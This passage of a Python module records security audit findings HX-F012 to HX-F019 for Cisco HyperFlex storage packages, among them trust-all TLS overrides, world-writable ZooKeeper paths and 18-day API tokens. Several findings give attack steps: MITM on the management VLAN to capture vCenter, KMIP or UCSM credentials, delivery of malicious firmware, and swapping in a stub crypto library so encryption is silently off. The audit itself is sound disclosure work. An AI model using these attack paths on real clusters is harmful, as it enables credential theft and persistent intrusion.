        "token issued by the AAA service, eliminating the static shared secret entirely."
    ),
    "tags": ["weak-random", "world-readable-token", "authentication-bypass", "cwe-330", "cwe-732", "critical"],
}

for _f in [
    HX_F005,
    HX_F006,
    HX_F007,
    HX_F008,
    HX_F009,
    HX_F010,
    HX_F011,
]:
    FINDINGS[_f["id"]] = _f

# ─── storfs-restapi 6.0.2b (Tomcat 10 WAR stack) ────────────────────────────

HX_F012 = {
    "id":       "HX-F012",
    "title":    "storfs-restapi 6.0.2b: defaultTokenLifeTime hardcoded to 1,555,200,000 ms "
                "(18 days) across all REST API WAR configs — stolen token valid for 18 days",
    "status":   "CONFIRMED — WEB-INF/classes/application.conf in auth/coreapi/encryption/"
                "supportservice/securityservice-1.0.0.war in storfs-restapi_6.0.2b-44423_amd64.deb",
    "severity": "HIGH",

    "config_value": "defaultTokenLifeTime = 1555200000",
    "computed":     "1,555,200,000 ms = 1,555,200 s = 25,920 min = 432 h = 18 days",

    "affected_wars": [
        "auth-1.0.0.war",
        "coreapi-1.0.0.war",
        "encryption-1.0.0.war",
        "supportservice-1.0.0.war",
        "securityservice-1.0.0.war",
    ],

    "impact": (
        "Any HX Connect REST API bearer token (obtained via /aaa/v1/auth with valid credentials, "
        "default creds, or credential stuffing) remains valid for 18 days without re-authentication. "
        "HX-F005 yields hxadmin credential hash from ZooKeeper — cracking that hash and obtaining "
        "a token grants 18-day persistent REST API access. Token revocation via /aaa/v1/revoke "
        "exists but is not automatic. The defaultIdleTimeout (30 min) triggers on inactivity, "
        "but a polling attacker avoids it with periodic GETs."
    ),

    "source_file":  "WEB-INF/classes/application.conf (identical across all WARs)",
    "config_path":  "/opt/hyperflex/storfs-restapi/<war>/WEB-INF/classes/application.conf",
    "tags":         ["long-token-lifetime", "session-management", "cwe-613", "high"],
}

HX_F013 = {
    "id":       "HX-F013",
    "title":    "storfs-restapi 6.0.2b: hxSvcHttpEnabled=true and hyperVSvcHttpEnabled=true "
                "in all WAR configs — internal REST API service traffic uses unencrypted HTTP",
    "status":   "CONFIRMED — application.conf across all storfs-restapi WARs",
    "severity": "HIGH",

    "config_values": {
        "hxSvcHttpEnabled":     "true",
        "hyperVSvcHttpEnabled": "true",
    },

    "impact": (
        "Inter-service communication on the stCtlVM and between HyperFlex nodes uses HTTP "
        "(not HTTPS) when these flags are true. Any attacker with network access to the "
        "stCtlVM management interface (typically accessible from ESXi hosts, vCenter, "
        "and adjacent management network segments) can intercept plaintext service "
        "authentication tokens and credentials. "
        "Combined with HX-F006 (ZooKeeper stores ESXi/vCenter credentials), an attacker "
        "on the management VLAN can passively harvest service credentials exchanged over HTTP."
    ),

    "deployment_scope": (
        "Applies to all HXDP 6.0.2b stCtlVM deployments. The flags are hardcoded true "
        "in the shipped config with no documented override mechanism."
    ),

    "source_file": "WEB-INF/classes/application.conf (all WARs)",
    "tags":        ["cleartext-service", "http-not-https", "cwe-319", "high"],
}

HX_F014 = {
    "id":       "HX-F014",
    "title":    "HXDP common.lib ships Cisco internal build toolchain path /build/sptoolchain "
                "in production packages — present in storfs-core 5.5.2b and storfs-restapi 6.0.2b",
    "status":   "CONFIRMED — common.lib in storfs-core_5.5.2b-43453 AND storfs-restapi_6.0.2b-44423",
    "severity": "LOW",

    "artifacts": [
        "/opt/springpath/storfs-core/common.lib (storfs-core 5.5.2b-43453)",
        "/opt/hyperflex/storfs-restapi/common.lib (storfs-restapi 6.0.2b-44423)",
    ],
    "leak":      'TCROOT="/build/sptoolchain"',
    "also_leaks": [
        "HCL_CONF path: $SRCDIR/src/scripts/catalog/springpath-hcl.conf",
        "Installer OVA path: /build/sptoolchain/springpath/installer/2.5.1/hx-master-os.ova",
        "HyperV OVA path: /build/sptoolchain/springpath/hyperv/hx-master-os.ova",
    ],
    "impact": (
        "Reveals Cisco/Springpath internal build system path, toolchain layout, and "
        "internal project names (springpath, sptoolchain). Present across at least two "
        "major HXDP release lines (5.5 and 6.0). Enables targeted directory traversal "
        "or path confusion on any system that uses this path variable at runtime. "
        "Build path leaks are entry points for supply chain reconnaissance."
    ),
    "tags":      ["build-path-leak", "info-disclosure", "cwe-209", "cross-version", "low"],
}

for _f in [HX_F012, HX_F013, HX_F014]:
    FINDINGS[_f["id"]] = _f

# ── HX-F015 ──────────────────────────────────────────────────────────────────
HX_F015 = {
    "id":       "HX-F015",
    "title":    "storfs-restapi production WARs (securityservice, encryption) call "
                "HttpsURLConnection.setDefaultSSLSocketFactory() and setDefaultHostnameVerifier() "
                "in StMgrClient.trustAll() and HxSecuritySvcMgrClient.trustAll() — "
                "JVM-wide TLS certificate validation permanently disabled after first client open",
    "status":   "CONFIRMED — constant pool of StMgrClient.class and HxSecuritySvcMgrClient.class "
                "from storfs-restapi_6.0.2b-44423_amd64.deb securityservice/encryption WARs",
    "severity": "HIGH",

    "affected_classes": {
        "securityservice.war": [
            "com.springpath.hx.security.gateway.StMgrClient (HOST=localhost, PORT=9333)",
            "com.springpath.hx.security.gateway.HxSecuritySvcMgrClient (HOST=localhost, PORT=8055)",
        ],
        "encryption.war": [
            "com.springpath.hx.encryption.clients.StMgrClient (HOST=localhost, PORT=9333)",
        ],
    },
    "jvm_global_calls": [
        "javax.net.ssl.HttpsURLConnection.setDefaultSSLSocketFactory(nullTrustFactory)",
        "javax.net.ssl.HttpsURLConnection.setDefaultHostnameVerifier(alwaysTrueVerifier)",
    ],
    "impact": (
        "Both calls are JVM-level singletons — once either client calls openClient(), every "
        "subsequent HTTPS connection from the Tomcat JVM process (vCenter extension registration "
        "via registerVCenter(), KMIP server connections from encryption.war, UCSM REST API calls, "
        "Consent Token sync via HxSecuritySvcMgrClient.syncToken()) accepts any certificate. "
        "Distinct from installer appliance WebDownloader pattern (already noted in module): "
        "this is the production cluster WAR path."
    ),
    "exploitation": (
        "Network attacker on management VLAN: (1) ARP-poison or BGP-inject to intercept outbound "
        "HTTPS from stCtlVM Tomcat; (2) present any self-signed cert; (3) capture vCenter, KMIP, "
        "or UCSM credentials transmitted after the first StMgr client open triggers trustAll()."
    ),
    "tags": ["tls-bypass", "jvm-global", "mitm", "cwe-295", "high"],
}

# ── HX-F016 ──────────────────────────────────────────────────────────────────
HX_F016 = {
    "id":       "HX-F016",
    "title":    "zkclient.py setData() creates ZooKeeper paths via ensure_path() with no ACL "
                "argument — defaults to OPEN_ACL_UNSAFE; all storfs-core ZK paths world-writable "
                "by any authenticated ZooKeeper client on the cluster network",
    "status":   "CONFIRMED — zkclient.py setData() in storfs-core_5.5.2b-43453_x86_64.deb; "
                "kazoo ensure_path() default ACL is OPEN_ACL_UNSAFE when acl param omitted",
    "severity": "MEDIUM",

    "code_path": "/opt/springpath/storfs-core/zkclient.py",
    "vulnerable_method": "ZKClient.setData(path, data, version=-1)",
    "vulnerable_call":   "self.zkClient.ensure_path(path)  # no acl= arg -> OPEN_ACL_UNSAFE",
    "zk_endpoint":       "localhost:2181 (from /etc/springpath/storfs.cfg zkConnectString)",
    "impact": (
        "ZK paths created by storfs-core (cluster config, encryption key references, node "
        "inventory, BIOS policy paths) default to world-writable ACL. Any process that can "
        "connect to ZooKeeper on port 2181 — which has no authentication by default — can "
        "overwrite these paths. Combined with HX-F005 (ZK stores user credential hashes) and "
        "HX-F006 (ZK stores AES-encrypted cluster credentials), write access enables "
        "credential and config tampering without any ZK auth token."
    ),
    "zk_note": (
        "The existing auth token scheme (postEvent; + cluster_uuid from /rest/v1/cluster) "
        "is the read bypass; OPEN_ACL_UNSAFE write means no token is required to overwrite "
        "existing nodes set by setDataWithRetry()."
    ),
    "tags": ["zookeeper", "acl", "no-auth", "cwe-732", "medium"],
}

# ── HX-F017 ──────────────────────────────────────────────────────────────────
HX_F017 = {
    "id":       "HX-F017",
    "title":    "storfs-core ships libcrypt_disabled.so stub that emits ASSERT NOT REACHED "
                "panic for all SECrypt operations — replacement of production crypto library "
                "at /opt/springpath/storfs-core/encrypt/ silently disables DARE without "
                "clearing invSecEncSystem=true tunable",
    "status":   "CONFIRMED — strings from libcrypt_disabled.so in storfs-core_5.5.2b-43453; "
                "source path /opt/git/cypress/src/encrypt/crypt_disabled.c present",
    "severity": "MEDIUM",

    "stub_path":      "/opt/springpath/storfs-core/encrypt/libcrypt_disabled.so",
    "source_path":    "/opt/git/cypress/src/encrypt/crypt_disabled.c",
    "exported_syms": [
        "SECrypt_Encrypt", "SECrypt_Decrypt", "SECrypt_EncryptAuth", "SECrypt_DecryptAuth",
        "SECrypt_EncryptIOV", "SECrypt_DecryptIOV", "SECrypt_RandBytes", "SECrypt_RandBytesLocked",
        "SECrypt_Base64Encode", "SECrypt_Base64Decode", "SECrypt_IsSupported",
        "SECrypt_IsRandThreadSafe", "SECrypt_CleanupThreadState", "SECrypt_PrintStats",
    ],
    "stub_behavior":  "All functions emit 'ASSERT NOT REACHED: ' then abort — not silent NOP",
    "encryption_config_flag": "/opt/springpath/storfs-core/encryption.tunes: invSecEncSystem=true",
    "impact": (
        "Attacker with write access to /opt/springpath/storfs-core/encrypt/ (or via LD_PRELOAD "
        "injection, package downgrade through update mechanism, or TOCTOU during deb install) "
        "can substitute libcrypt_disabled.so as the active crypto library. Result: all DARE "
        "encrypt/decrypt operations abort the storfs process rather than encrypting data. "
        "invSecEncSystem=true remains set — monitoring and compliance tooling sees encryption "
        "as enabled while storage is written plaintext. No data exfiltration required to "
        "disable protection; a single file replace achieves it."
    ),
    "tags": ["stub-library", "dare-bypass", "filesystem-write", "cwe-311", "medium"],
}

# ── HX-F018 ──────────────────────────────────────────────────────────────────
HX_F018 = {
    "id":       "HX-F018",
    "title":    "hxupgrade.war UpgradeSvcAccess.trustAll() calls HttpsURLConnection."
                "setDefaultSSLSocketFactory() and setDefaultHostnameVerifier() — JVM-wide "
                "TLS bypass in the firmware upgrade service; MITM of upgrade HTTPS connections "
                "enables malicious firmware delivery to stCtlVM",
    "status":   "CONFIRMED — constant pool of UpgradeSvcAccess.class and anonymous inner "
                "classes $1/$2 from storfs-restapi_6.0.2b-44423_amd64.deb hxupgrade.war",
    "severity": "HIGH",

    "class_path":  "com.springpath.hxupgrade.service.UpgradeSvcAccess",
    "inner_classes": {
        "UpgradeSvcAccess$1": "implements javax.net.ssl.X509TrustManager — empty "
                              "checkClientTrusted() and checkServerTrusted(); calls parent trustAll()",
        "UpgradeSvcAccess$2": "implements javax.net.ssl.HostnameVerifier — verify() returns true; "
                              "enclosing method = UpgradeSvcAccess.trustAll()",
    },
    "jvm_global_calls": [
        "javax.net.ssl.HttpsURLConnection.setDefaultSSLSocketFactory(nullTrustFactory)  // bytecode offset 38",
        "javax.net.ssl.HttpsURLConnection.setDefaultHostnameVerifier(alwaysTrueVerifier) // bytecode offset 50",
    ],
    "distinction_from_HX_F015": (
        "HX-F015 covers securityservice.war + encryption.war (internal localhost connections: "
        "StMgr on 9333, HxSecuritySvcMgr on 8055). HX-F018 is the upgrade service — "
        "UpgradeSvcAccess makes HTTPS connections to external firmware repositories "
        "(software.cisco.com or internal proxy). trustAll() before external download "
        "allows MITM to substitute any firmware image for a legitimate Cisco package."
    ),
    "impact": (
        "Attacker on management VLAN intercepts HTTPS firmware download from hxupgrade.war "
        "and serves a malicious package. Because the JVM-wide override applies at the Java "
        "runtime level, any certificate (self-signed, expired, wrong CN) is accepted. "
        "Successful MITM delivers attacker-controlled .deb/.pkg to stCtlVM and executes "
        "as part of the upgrade flow, achieving persistent code execution on the HyperFlex "
        "storage controller VM."
    ),
    "tags": ["tls-bypass", "jvm-global", "mitm", "firmware-supply-chain", "cwe-295", "high"],
}


# ── HX-F019 ──────────────────────────────────────────────────────────────────
HX_F019 = {
    "id":       "HX-F019",
    "title":    "supportservice.war WebDownloader static initializer calls trustAllHttpsCertificates() "
                "at class load time — JVM-wide TLS bypass installed before any getStream() call; "
                "getStream() additionally sets Authenticator.setDefault() with caller-supplied "
                "username/password as JVM-global HTTP authenticator for ASUP/callhome connections",
    "status":   "CONFIRMED — bytecode of WebDownloader.class and WebDownloader$1.class from "
                "storfs-restapi_6.0.2b-44423_amd64.deb supportservice.war",
    "severity": "HIGH",

    "class_paths": [
        "com.springpath.hx.support.util.WebDownloader (supportservice.war)",
        "com.storvisor.sysmgmt.service.WebDownloader (ROOT.war)",
    ],
    "class_path":   "com.springpath.hx.support.util.WebDownloader",
    "static_init": {
        "trigger":  "JVM class load of WebDownloader (first use of any WebDownloader method)",
        "sequence": [
            "static {} calls trustAllHttpsCertificates() — offset 0",
            "trustAllHttpsCertificates() builds SSLContext with TrustAllManager (null-trust X509TrustManager), "
            "calls HttpsURLConnection.setDefaultSSLSocketFactory(nullTrustFactory)",
            "static {} then instantiates WebDownloader$2 (HostnameVerifier always-true), "
            "calls HttpsURLConnection.setDefaultHostnameVerifier(alwaysTrueVerifier) — offset 10",
        ],
        "persistence": (
            "Static initializer runs once and is not reversible within the JVM lifetime. "
            "Unlike HX-F015 (method-triggered) and HX-F018 (method-triggered), this bypass "
            "is installed PERMANENTLY at class load time — independent of whether getStream() "
            "is ever called. All HTTPS connections in the storfs-restapi Tomcat JVM are affected "
            "from the moment WebDownloader is first referenced. "
            "ROOT.war contains an identical copy (com.storvisor.sysmgmt.service.WebDownloader) "
            "with bytecode-identical static initializer — two independent class-load triggers "
            "in the same Tomcat JVM, either sufficient to permanently poison JVM TLS state."
        ),
    },
    "get_stream_bypass": {
        "signature":    "public static InputStream getStream(String url, String username, String password)",
        "sequence": [
            "offset 0-9: new WebDownloader$1(username, password) — anonymous Authenticator subclass",
            "offset 9: Authenticator.setDefault(authenticator) — JVM-global HTTP authenticator override",
            "offset 12-20: new URL(url).openStream() — opens the (TLS-bypassed) connection",
        ],
        "authenticator_inner_class": (
            "WebDownloader$1 extends java.net.Authenticator; overrides getPasswordAuthentication() "
            "to return new PasswordAuthentication(username, password.toCharArray()). "
            "Authenticator.setDefault() installs this as the JVM-global HTTP auth handler: "
            "any HTTP 401/407 challenge from ANY host in the JVM triggers credential delivery."
        ),
    },
    "inner_classes": {
        "WebDownloader$TrustAllManager": "implements javax.net.ssl.X509TrustManager — "
                                         "getAcceptedIssuers() returns null; "
                                         "checkClientTrusted() and checkServerTrusted() are empty",
        "WebDownloader$1":  "extends java.net.Authenticator — getPasswordAuthentication() returns "
                            "PasswordAuthentication(username, password); installed JVM-global via setDefault()",
        "WebDownloader$2":  "implements javax.net.ssl.HostnameVerifier — verify() always true",
    },
    "distinction_from_hx_f015_f018": (
        "HX-F015: securityservice.war + encryption.war — method-triggered trustAll, internal localhost. "
        "HX-F018: hxupgrade.war — method-triggered trustAll, external firmware download. "
        "HX-F019: static initializer — class-load-time bypass, permanent; also adds "
        "Authenticator.setDefault() with caller credentials as JVM-global HTTP authenticator. "
        "WebDownloader is used on the ASUP/callhome/support bundle transfer path "
        "(SupportbundleApiServiceImpl, GenerationThread) — attacker on management VLAN intercepts "
        "support bundle uploads (cluster configs, secrets in logs) and injects responses."
    ),
    "impact": (
        "1. JVM-wide TLS certificate validation disabled permanently from class load — "
        "affects all six WARs in the same Tomcat instance. "
        "2. MITM of ASUP support bundle HTTPS uploads intercepts cluster configs, credentials, "
        "and diagnostic data destined for Cisco TAC. "
        "3. Authenticator.setDefault() installs attacker-supplied credentials as JVM-global HTTP "
        "authenticator — if any other HTTP connection in the JVM receives a 401 challenge "
        "(from an attacker-controlled server), those credentials are delivered automatically."
    ),
    "asup_path": [
        "SupportbundleApiServiceImpl invokes GenerationThread",
        "GenerationThread calls asupcli (ASUP CLI) and WebDownloader.getStream() for manifest download",
        "AsupCliConfiguration.getManifestFile() provides the URL — URL sourced from REST API input",
        "trustAllHttpsCertificates() already active (class-load) — any cert accepted",
    ],
    "tags": ["tls-bypass", "jvm-global", "static-init", "authenticator-bypass",
             "asup", "callhome", "mitm", "cwe-295", "high"],
}

for _f in [HX_F015, HX_F016, HX_F017, HX_F018, HX_F019]:
    FINDINGS[_f["id"]] = _f

FINDINGS_LIST = list(FINDINGS.values())

if __name__ == "__main__":
    for fid, f in FINDINGS.items():
        print(f"[{f['severity']:8s}] {fid}: {f['title'][:80]}")

